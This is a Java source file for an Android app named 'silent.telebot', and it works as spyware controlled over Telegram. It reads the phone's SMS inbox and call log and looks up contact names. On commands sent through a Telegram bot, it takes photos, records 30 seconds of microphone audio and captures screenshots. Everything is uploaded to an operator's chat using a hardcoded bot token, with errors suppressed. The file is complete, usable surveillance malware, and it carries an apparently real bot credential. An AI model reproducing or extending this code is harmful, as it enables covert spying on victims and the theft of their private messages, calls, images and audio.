package com.silent.telebot;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class TelegramPoller implements Runnable {
    private Context ctx;
    private DatabaseHelper dbHelper;

    // ⚠️ غيّر هذين السطرين فقط:
    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
    private static final String CHAT_ID = "7058836561";

    private static int lastUpdateId = 0;

    public TelegramPoller(Context ctx) {
        this.ctx = ctx;
        try {
            this.dbHelper = new DatabaseHelper(ctx);
        } catch (Exception e) {
            Log.e("TelegramPoller", "فشل تهيئة قاعدة البيانات: " + e.getMessage());
        }
    }

    @Override
    public void run() {
        try {
            syncDataFromPhone();

            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            conn.disconnect();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray updates = jsonResponse.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        handleCommand(text);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("TelegramPoller", "خطأ رئيسي: " + e.getMessage());
        }
    }

    private void syncDataFromPhone() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ctx.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            if (ctx.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                ContentResolver cr = ctx.getContentResolver();
                Cursor cursor = null;
                try {
                    cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
                            new String[]{"_id", "address", "body", "date"},
                            null, null, "date DESC");
                    if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                        do {
                            try {
                                long id = cursor.getLong(0);
                                String address = cursor.getString(1);
                                String body = cursor.getString(2);
                                long date = cursor.getLong(3);
                                if (address != null && body != null) {
                                    dbHelper.insertSms(id, address, body, date);
                                }
                            } catch (Exception ignored) {}
                        } while (cursor.moveToNext());
                    }
                } catch (Exception ignored) {}
                finally { if (cursor != null) cursor.close(); }
            }
        } catch (Exception ignored) {}

        try {
            ContentResolver cr = ctx.getContentResolver();
            Cursor cursor = null;
            try {
                cursor = cr.query(CallLog.Calls.CONTENT_URI,
                        new String[]{"_id", "number", "duration", "type", "date"},
                        null, null, "date DESC");
                if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                    do {
                        try {
                            long id = cursor.getLong(0);
                            String number = cursor.getString(1);
                            long duration = cursor.getLong(2);
                            int type = cursor.getInt(3);
                            long date = cursor.getLong(4);
                            if (number != null) {
                                dbHelper.insertCall(id, number, duration, type, date);
                            }
                        } catch (Exception ignored) {}
                    } while (cursor.moveToNext());
                }
            } catch (Exception ignored) {}
            finally { if (cursor != null) cursor.close(); }
        } catch (Exception ignored) {}
    }

    private void handleCommand(String cmd) {
        try {
            if (cmd.equals("/help")) {
                sendMessage(CHAT_ID, "📋 **الأوامر**\n━━━━━━━━━━━━━━━━━━\n" +
                        "📩 /get_sms - آخر 10 رسائل (محلية)\n" +
                        "📞 /get_calls - آخر 10 مكالمات (محلية)\n" +
                        "📷 /take_pic - التقاط صورة\n" +
                        "🎤 /record - تسجيل صوتي (30ث)\n" +
                        "🖥️ /screenshot - لقطة شاشة");
            }
            else if (cmd.equals("/get_sms")) {
                sendMessage(CHAT_ID, getSmsFromLocalDB());
            }
            else if (cmd.equals("/get_calls")) {
                sendMessage(CHAT_ID, getCallsFromLocalDB());
            }
            else if (cmd.equals("/take_pic")) {
                capturePhoto();
            }
            else if (cmd.equals("/record")) {
                startRecording();
            }
            else if (cmd.equals("/screenshot")) {
                ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
            }
            else {
                sendMessage(CHAT_ID, "❌ أمر غير معروف. استخدم /help");
            }
        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ حدث خطأ: " + e.getMessage());
            Log.e("TelegramPoller", "خطأ في الأمر: " + e.getMessage());
        }
    }

    private String getSmsFromLocalDB() {
        try {
            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
            List<Map<String, String>> list = dbHelper.getLastSms(10);
            if (list.isEmpty()) return "📭 لا توجد رسائل محفوظة.";
            StringBuilder sb = new StringBuilder("📩 **آخر 10 رسائل (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
            for (Map<String, String> sms : list) {
                try {
                    String address = sms.get("address");
                    String body = sms.get("body");
                    String dateStr = sms.get("date");
                    if (address == null || body == null || dateStr == null) continue;

                    String name = getContactName(address);
                    String display = (name != null) ? name : address;
                    long dateMillis = Long.parseLong(dateStr);
                    sb.append("👤 **").append(display).append("**\n");
                    sb.append("📝 ").append(body).append("\n");
                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
                } catch (Exception ignored) {}
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ خطأ في قراءة الرسائل: " + e.getMessage();
        }
    }

    private String getCallsFromLocalDB() {
        try {
            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
            List<Map<String, String>> list = dbHelper.getLastCalls(10);
            if (list.isEmpty()) return "📭 لا توجد مكالمات محفوظة.";
            StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
            for (Map<String, String> call : list) {
                try {
                    String number = call.get("number");
                    String durationStr = call.get("duration");
                    String typeStr = call.get("type");
                    String dateStr = call.get("date");
                    if (number == null || durationStr == null || typeStr == null || dateStr == null) continue;

                    String name = getContactName(number);
                    String display = (name != null) ? name : number;
                    int type = Integer.parseInt(typeStr);
                    String typeDisplay = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
                                         (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
                    long dateMillis = Long.parseLong(dateStr);
                    sb.append("👤 **").append(display).append("**\n");
                    sb.append("📌 ").append(typeDisplay).append("\n");
                    sb.append("⏱️ ").append(formatDuration(Long.parseLong(durationStr))).append("\n");
                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
                } catch (Exception ignored) {}
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ خطأ في قراءة المكالمات: " + e.getMessage();
        }
    }

    private void capturePhoto() {
        try {
            File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
            if (photoFile.exists()) photoFile.delete();
            Uri photoUri = androidx.core.content.FileProvider.getUriForFile(ctx,
                    ctx.getPackageName() + ".fileprovider", photoFile);

            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            intent.putExtra(MediaStore.EXTRA_OUTPUT, photoUri);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            ctx.startActivity(intent);

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (photoFile.exists() && photoFile.length() > 0) {
                    sendPhotoStatic(CHAT_ID, photoFile, BOT_TOKEN);
                } else {
                    sendMessage(CHAT_ID, "❌ فشل التقاط الصورة.");
                }
            }, 3000);

        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ خطأ في الكاميرا: " + e.getMessage());
        }
    }

    private void startRecording() {
        try {
            File audioFile = new File(ctx.getCacheDir(), "recording.3gp");
            if (audioFile.exists()) audioFile.delete();

            android.media.MediaRecorder recorder = new android.media.MediaRecorder();
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            sendMessage(CHAT_ID, "🎙️ تسجيل لمدة 30 ثانية...");
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    if (audioFile.exists() && audioFile.length() > 0) {
                        sendAudioStatic(CHAT_ID, audioFile, BOT_TOKEN);
                    } else {
                        sendMessage(CHAT_ID, "❌ فشل التسجيل.");
                    }
                } catch (Exception e) {
                    sendMessage(CHAT_ID, "❌ خطأ: " + e.getMessage());
                }
            }, 30000);

        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ صلاحية الميكروفون غير ممنوحة.");
        }
    }

    public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + photoFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(photoFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendAudioStatic(String chatId, File audioFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendAudio");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + audioFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(audioFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendMessageStatic(String chatId, String text) {
        try {
            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedText;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    private String getContactName(String phoneNumber) {
        if (phoneNumber == null || phoneNumber.isEmpty()) return null;
        try {
            ContentResolver cr = ctx.getContentResolver();
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
            Cursor cursor = null;
            try {
                cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
                if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
            } finally { if (cursor != null) cursor.close(); }
        } catch (Exception ignored) {}
        return null;
    }

    private String formatDuration(long seconds) {
        if (seconds < 60) return seconds + " ثانية";
        long minutes = seconds / 60;
        long secs = seconds % 60;
        if (secs == 0) return minutes + " دقيقة";
        return minutes + " دقيقة و " + secs + " ثانية";
    }

    private void sendMessage(String chatId, String text) {
        try {
            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedText;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { /* صامت */ }
    }
}
